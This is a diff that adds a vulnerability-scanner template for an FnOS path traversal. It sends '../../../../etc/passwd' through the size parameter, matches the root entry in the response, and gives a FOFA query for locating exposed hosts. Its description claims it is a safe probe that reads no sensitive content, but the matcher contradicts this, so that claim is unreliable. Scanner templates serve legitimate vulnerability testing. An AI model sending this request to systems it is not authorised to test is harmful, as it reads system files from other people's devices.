@@ -1,0 +1,38 @@
+id: fnos-app-center-lfi
+
+info:
+  name: FnOS app-center-static serviceicon - Path Traversal / Arbitrary File Read
+  author: qwtd
+  severity: high
+  description: |
+    FnOS 的 app-center-static/serviceicon/myapp/{0} 接口存在路径处理不当风险。
+    文章指出该接口通过 size 参数可被注入包含 ../ 的路径片段，从而造成任意文件读取。
+    本模板为“安全探测版”：不读取/匹配敏感文件内容，仅通过响应差异（Content-Type/状态码）判断是否疑似可穿越。
+  reference:
+    - https://raw.githubusercontent.com/gelusus/wxvl/0de2bb233dfed2ecf1ec4627299450ac164c5c64/doc/2026-02/%E9%A3%9E%E7%89%9B%E7%B3%BB%E7%BB%9FFnOS%E4%B8%8Bapp-center-static%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20%E9%99%84POC.md
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: icon_hash="470295793" || app="飞牛-私有云fnOS"
+  tags: 飞牛-fnOS
+
+http:
+  - raw:
+      - |
+        GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
